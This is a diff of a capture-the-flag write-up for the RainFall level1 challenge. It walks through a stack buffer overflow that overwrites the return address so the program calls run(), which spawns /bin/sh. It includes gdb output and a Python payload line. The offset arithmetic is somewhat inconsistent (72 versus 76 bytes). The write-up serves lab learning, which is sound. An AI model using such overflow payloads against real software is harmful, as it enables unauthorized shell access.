@@ -55,7 +55,7 @@ So if the buffer is 64 bytes… And we send 200 bytes… It will happily overwri
 
 By overwriting the RET value with the address of run() we can force its execution.
 
-
+1) 
 -----------------------------
 Find Offset to Return Address
 -----------------------------
@@ -79,6 +79,32 @@ Program received signal SIGSEGV, Segmentation fault.
 + 4 (saved EBP)
 + 4 (return address overwrite position)
 = 72 bytes to reach EIP
+
+we know that from gdb main: 
+The first instruction allocate 80 bytes on the stack 
+The second one takes 16 bytes for temparory storage 
+
+2) 
+
+Now we want to execute the function run() because it calls system(0x8048584)
+
+and the address 0x8048584 contains "bin/sh", we can check that using the command : 
+x/s 0x8048584
+
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+
+so the porpuse now is to make the main() function calls the run() function, and the run() function will open the shell so we can find our password
+
+
+0x08048444  is the address of run()
+
+Now we should go to the return address and overwrite it:
+
+64 buffer
++4 saved EBP
++4 reach return address
++4 overwrite EIP
 
 
 level1@RainFall:~$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
